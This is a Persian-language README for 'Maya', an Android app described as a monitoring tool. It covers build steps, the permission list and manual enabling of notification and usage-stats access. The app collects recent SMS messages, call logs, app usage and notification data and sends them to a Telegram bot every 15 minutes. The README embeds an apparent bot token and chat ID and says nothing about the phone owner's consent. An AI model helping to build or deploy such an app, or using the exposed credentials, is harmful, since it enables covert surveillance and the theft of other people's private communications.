# Maya - Android Monitoring App

این برنامه یک اپلیکیشن اندروید است که اطلاعات SMS، تماس‌ها، استفاده از برنامه‌ها و نوتیفیکیشن‌ها را جمع‌آوری کرده و به تلگرام ارسال می‌کند.

## 📋 پیش‌نیازها

برای ساخت فایل APK نیاز به موارد زیر دارید:

### در سیستم Linux یا macOS:
```bash
# نصب Python 3.8+
python3 --version

# نصب pip
sudo apt-get install python3-pip  # Ubuntu/Debian
brew install python3              # macOS

# نصب Buildozer
pip3 install buildozer

# نصب Cython
pip3 install cython

# وابستگی‌های سیستمی (Ubuntu/Debian)
sudo apt-get install -y \
    git \
    zip \
    unzip \
    openjdk-17-jdk \
    autoconf \
    libtool \
    pkg-config \
    zlib1g-dev \
    libncurses5-dev \
    libncursesw5-dev \
    libtinfo5 \
    cmake \
    libffi-dev \
    libssl-dev

# وابستگی‌های سیستمی (macOS)
brew install autoconf automake libtool pkg-config
brew install openssl
```

## 🚀 نحوه ساخت APK

### روش 1: استفاده از Buildozer (توصیه می‌شود)

```bash
# 1. رفتن به پوشه پروژه
cd /Users/Night/ponisha

# 2. پاکسازی build قبلی (اختیاری)
buildozer android clean

# 3. ساخت APK در حالت Debug
buildozer android debug

# 4. ساخت APK در حالت Release (برای انتشار)
buildozer android release
```

فایل APK ساخته شده در مسیر زیر قرار می‌گیرد:
```
/Users/Night/ponisha/bin/maya-3.0-arm64-v8a_armeabi-v7a-debug.apk
```

### روش 2: استفاده از Docker (برای Windows)

اگر از Windows استفاده می‌کنید، بهتر است از Docker استفاده کنید:

```bash
# اجرای buildozer در Docker
docker run --rm -v "$PWD":/home/user/hostcwd kivy/buildozer android debug
```

## ⚙️ تنظیمات مهم

### 1. توکن و Chat ID تلگرام
در فایل `main.py` توکن و Chat ID شما قرار داده شده است:
```python
BOT_TOKEN = "8246973343:AAHkC5H-00l_J1Z9T3pE4A9K8n3q7Q5XyZ8"
CHAT_ID = "7156363630"
```

### 2. فاصله زمانی گزارش‌دهی
گزارش‌ها هر 15 دقیقه ارسال می‌شوند. برای تغییر این مقدار:
```python
REPORT_INTERVAL = 900  # بر حسب ثانیه (900 = 15 دقیقه)
```

## 🔐 مجوزهای مورد نیاز

برنامه به مجوزهای زیر نیاز دارد که در `buildozer.spec` تعریف شده‌اند:

1. **INTERNET** - برای ارسال داده به تلگرام
2. **READ_SMS** - خواندن پیامک‌ها
3. **READ_CALL_LOG** - خواندن تاریخچه تماس‌ها
4. **READ_CONTACTS** - خواندن مخاطبین
5. **PACKAGE_USAGE_STATS** - دسترسی به آمار استفاده از برنامه‌ها
6. **BIND_NOTIFICATION_LISTENER_SERVICE** - دسترسی به نوتیفیکیشن‌ها
7. **FOREGROUND_SERVICE** - اجرای سرویس در پس‌زمینه

### ⚠️ مجوزهای ویژه (نیاز به فعال‌سازی دستی)

دو مجوز زیر باید توسط کاربر **به صورت دستی** در تنظیمات اندروید فعال شوند:

#### 1. Usage Stats (آمار استفاده):
```
تنظیمات → امنیت و حریم خصوصی → دسترسی ویژه → دسترسی به آمار استفاده → Maya
```

#### 2. Notification Listener (دسترسی به نوتیفیکیشن):
```
تنظیمات → اعلان‌ها → دسترسی به اعلان‌ها → Maya
```

## 📱 نحوه استفاده

1. فایل APK را روی گوشی اندروید نصب کنید
2. برنامه را باز کنید و مجوزها را تایید کنید
3. مجوزهای ویژه (Usage Stats و Notification Listener) را دستی فعال کنید
4. برنامه را باز نگه دارید (نباید کاملاً بسته شود)
5. هر 15 دقیقه گزارش به تلگرام ارسال می‌شود

## 🐛 عیب‌یابی

### خطا: "Command failed: ./gradlew assembleDebug"
```bash
# پاکسازی و ساخت مجدد
buildozer android clean
rm -rf .buildozer
buildozer android debug
```

### خطا: "SDK License not accepted"
```bash
# در فایل buildozer.spec تنظیم شده است:
android.accept_sdk_license = True
```

### برنامه crash می‌کند
- مطمئن شوید مجوزها داده شده‌اند
- لاگ‌ها را با `adb logcat` بررسی کنید
- نسخه Kivy را چک کنید (باید 2.3.0 باشد)

## 📦 ساختار پروژه

```
ponisha/
├── main.py              # فایل اصلی برنامه
├── buildozer.spec       # فایل پیکربندی Buildozer
├── README.md            # این فایل
└── bin/                 # پوشه خروجی APK (بعد از build)
```

## 🔧 سفارشی‌سازی

### تغییر نام برنامه:
در `buildozer.spec`:
```ini
title = Maya
package.name = maya
```

### تغییر آیکون:
1. یک فایل `icon.png` (512x512) در پوشه پروژه قرار دهید
2. در `buildozer.spec` فعال کنید:
```ini
icon.filename = %(source.dir)s/icon.png
```

### ساخت برای معماری‌های خاص:
در `buildozer.spec`:
```ini
android.archs = arm64-v8a,armeabi-v7a  # پیش‌فرض
# یا فقط یکی:
android.archs = arm64-v8a
```

## 📝 یادداشت‌های مهم

- **نسخه اندروید**: حداقل Android 5.0 (API 21)
- **نسخه هدف**: Android 13 (API 33)
- **حجم APK**: حدود 20-30 مگابایت
- **زبان برنامه‌نویسی**: Python 3 + Kivy Framework
- **Build Time**: اولین build حدود 20-40 دقیقه طول می‌کشد

## 🎯 ویژگی‌ها

✅ ارسال آخرین 5 پیامک  
✅ ارسال آخرین 5 تماس  
✅ ارسال آمار استفاده از برنامه‌ها (24 ساعت گذشته)  
✅ بررسی وضعیت دسترسی به نوتیفیکیشن‌ها  
✅ ارسال خودکار گزارش هر 15 دقیقه  
✅ گزارش اولیه 10 ثانیه پس از اجرا  

## 📞 پشتیبانی

در صورت بروز مشکل:
1. لاگ‌های buildozer را بررسی کنید
2. مطمئن شوید تمام وابستگی‌ها نصب شده‌اند
3. نسخه Java را چک کنید (باید JDK 17 باشد)

---

**نسخه**: 3.0  
**تاریخ**: 2025  
**پلتفرم**: Android (API 21+)
